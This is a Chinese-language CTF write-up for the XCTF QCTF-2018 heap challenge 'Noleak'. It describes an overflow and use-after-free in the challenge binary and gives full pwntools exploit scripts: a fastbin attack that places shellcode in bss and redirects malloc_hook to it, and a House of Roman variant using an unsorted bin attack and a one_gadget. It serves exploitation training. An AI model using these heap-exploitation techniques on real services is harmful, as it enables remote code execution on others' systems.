# Noleak

题目来源：XCTF 4th-QCTF-2018

这题保护开的好少，栈/堆执行都开了。。

![aBWNMt](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/aBWNMt.png)

***Update***函数存在Overflow，没有控制size。

```python
malloc(0x20,"A"*0x10)
malloc(0x20,"B"*0x10)
edit(0,0x40,"C"*0x30) #overflow
```

![T9kQyl](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/T9kQyl.png)

存在一个Double Free/UAF，原因是free时没有将指针从buf中删除。

![J7P1Lt](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/J7P1Lt.png)

因为没有leak，而且got表覆盖也没有合适的函数。想直接用partial write来猜stdout地址，然后直接IO_FILE泄露地址。不过这道题stdout的结构居然没初始化，导致无法泄露地址。

不过顺着之前的思路，通过partial write来覆盖低地址，来猜测malloc_hook的地址。然后将shellcode写入bss段，让malloc_hook跳转到bss执行。（使用fastbin attack）

![OQG75i](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/OQG75i.png)

```python
#!/usr/bin/python
from pwn import *

p=process("./timu",env={"LD_PRELOAD":"libc-2.23.so"})
context.log_level='Debug'
context(arch='amd64', os='linux')
gdb.attach(p)


r  = lambda data	:p.recv(data)
ru = lambda data 	:p.recvuntil(data)
s  = lambda data	:p.send(data)
sl = lambda data	:p.sendline(data)

def malloc(size,data):
	ru("Your choice :")
	sl(str(1))
	ru("Size:")
	sl(str(size))
	ru("Data:")
	sl(data)
def free(index):
	ru("Your choice :")
	sl(str(2))	
	ru("Index:")
	sl(str(index))
def edit(index,size,data):
	ru("Your choice :")
	sl(str(3))
	ru("Index:")
	sl(str(index))
	ru("Size:")
	sl(str(size))
	ru("Data:")
	s(data)

#malloc(0x20,"O")	#
malloc(0x60,"writeshellcode")	#0

malloc(0x20,"O"*0x10)	#1
malloc(0x40,"A"*0x10)	#2
malloc(0x65,"B"*0x10)	#3
malloc(0x10,"C"*0x10)	#4



#house of roman#fail
'''
edit(3,0x52,"\x01"*0x40+p64(0)+p64(0x71)+"\xdd\x25")
malloc(0x65,"D"*0x10)	#4
flag=0xfbad1800
malloc(0x65,"\x00"*3+p64(0)*0x6+p64(flag)+p64(0)*3+"\x00")
'''

#fastbin -UAF-> control bss
free(0)
edit(0,0x20,p64(0x600ff5))
malloc(0x65,"D"*0x10)
malloc(0x65,asm(shellcraft.sh()).ljust(0x40,'\x00'))

#malloc_hook->bss
edit(1,0x30,"\x00"*0x20+p64(0)+p64(0xc1)) # size 0x51 ->0x51+0x70
free(3)
free(2)
malloc(0x40,"X"*0x10)

edit(2,0x52,"\x01"*0x40+p64(0)+p64(0x71)+"\xed\x1a")
malloc(0x65,"D"*0x10)	
sh=0x601005
malloc(0x65,"D"*0x3+p64(0)*2+p64(sh))

ru("Your choice :")
sl(str(1))
ru("Size:")
sl(str(0xa))



p.interactive()
```

本地写个脚本多跑几遍就出来了，一开始远程居然打不了。。。后来发现不小心注释了context系统版本。

![e6eJFU](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/e6eJFU.png)

其实结合unsortbin attack的话可以有有更高的可玩性（比如House of Roman），我们bss段里不存在合适的fastbin 对象，可以通过unsortbin attack写入，然后错位构建一个fastbin attack。[案例](https://blog.csdn.net/qq_43986365/article/details/104636687)

**House of Roman**

尝试使用unsortbin，将main _arena+0x88的地址写入malloc_hook。然后利用之前的fastbin attack，对malloc_hook进行partial write，修改为one_gadget。

*1.获取一个malloc_hook的chunk*

使用fastbin attack，获取一个能控制malloc_hook的chunk

```python
malloc(0x80,"house of roman")#0

malloc(0x20,"O"*0x10)	#1
malloc(0x40,"A"*0x10)	#2
malloc(0x65,"B"*0x10)	#3
malloc(0x10,"C"*0x10)	#4

#malloc_hook control
edit(1,0x30,"\x00"*0x20+p64(0)+p64(0xc1)) # size 0x51 ->0x51+0x70
free(3)
free(2)
malloc(0x40,"X"*0x10)  #5 #将main_arena值写入fastbin

edit(2,0x52,"\x01"*0x40+p64(0)+p64(0x71)+"\xed\x1a") #部分地址写，修改到malloc_hook
#malloc(0x65,"\x78\x1b") #fix unsortbin #6	
malloc(0x65,"DD") 
sh=0x601005
#malloc(0x65,"D"*0x3+p64(0)*2)#+p64(sh))
malloc(0x65,"D") #7 #控制malloc_hook的chunk，留着备用

#修复fastbin
free(6) #free 一个0x65的chunk，然后将fd->0，这是一个很有创意的思路
edit(6,0x8,p64(0)) #fix fastbin #nice
```

在使用fastbin attack之后，利用free 一个chunk，然后将fd->0（UAF），来Fix chunk，这是一个很好的思路。

*2.unsortbin attack*

通过unsortbin attack写入main_arena+0x88 到malloc_hook。然后再用之前获取到chunk，修改malloc_hook的低字节位置，修改为one_gadget。

```python
#house of roman
free(0)
edit(0,0x10,p64(0)+"\x00\x1b") 
malloc(0x80,"AAA")	#unsortbin attack -> malloc_hook 

#write one_gadget
edit(7,0x40,"\x01"*3+p64(0)*2+"\x16\x22\xa5")
#edit(7,0x40,"\x01"*3+p64(0)*2+"\xa4\xd2\xaf")
#edit(7,0x40,"\x01"*3+p64(0)*2+"\x47\xe1\xaf")
```

需要注意的是，unsortbin触发用的malloc(size)需要和前面溢出的chunk的size保持一致，不然malloc会crash。

不过貌似env问题，导致所有gadget无效。。有点可惜，要结合realloc的话，在*当前条件*下就比较麻烦了。。

EXP

```python
#!/usr/bin/python
from pwn import *

p=process("./timu",env={"LD_PRELOAD":"libc-2.23.so"})
#p=remote("111.198.29.45",33878)
#context.log_level='Debug'
context(arch='amd64', os='linux')
#gdb.attach(p)


r  = lambda data	:p.recv(data)
ru = lambda data 	:p.recvuntil(data)
s  = lambda data	:p.send(data)
sl = lambda data	:p.sendline(data)

def malloc(size,data):
	ru("Your choice :")
	sl(str(1))
	ru("Size:")
	sl(str(size))
	ru("Data:")
	s(data)
def free(index):
	ru("Your choice :")
	sl(str(2))	
	ru("Index:")
	sl(str(index))
def edit(index,size,data):
	ru("Your choice :")
	sl(str(3))
	ru("Index:")
	sl(str(index))
	ru("Size:")
	sl(str(size))
	ru("Data:")
	s(data)

#malloc(0x20,"O")	#
malloc(0x80,"house of roman")#0

malloc(0x20,"O"*0x10)	#1
malloc(0x40,"A"*0x10)	#2
malloc(0x65,"B"*0x10)	#3
malloc(0x10,"C"*0x10)	#4

#malloc_hook control
edit(1,0x30,"\x00"*0x20+p64(0)+p64(0xc1)) # size 0x51 ->0x51+0x70
free(3)
free(2)
malloc(0x40,"X"*0x10)  #5

edit(2,0x52,"\x01"*0x40+p64(0)+p64(0x71)+"\xed\x1a")
#malloc(0x65,"\x78\x1b") #fix unsortbin #6	
malloc(0x65,"DD") 
sh=0x601005
#malloc(0x65,"D"*0x3+p64(0)*2)#+p64(sh))
malloc(0x65,"D") #7

free(6)
edit(6,0x8,p64(0)) #fix fastbin #nice


#house of roman

free(0)
edit(0,0x10,p64(0)+"\x00\x1b") 
malloc(0x80,"AAA")	#unsortbin attack -> malloc_hook 

#write one_gadget
edit(7,0x40,"\x01"*3+p64(0)*2+"\x16\x22\xa5")
#edit(7,0x40,"\x01"*3+p64(0)*2+"\xa4\xd2\xaf")
#edit(7,0x40,"\x01"*3+p64(0)*2+"\x47\xe1\xaf")

ru("Your choice :")
sl(str(1))
ru("Size:")
sl(str(0x10))

p.interactive()
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
```

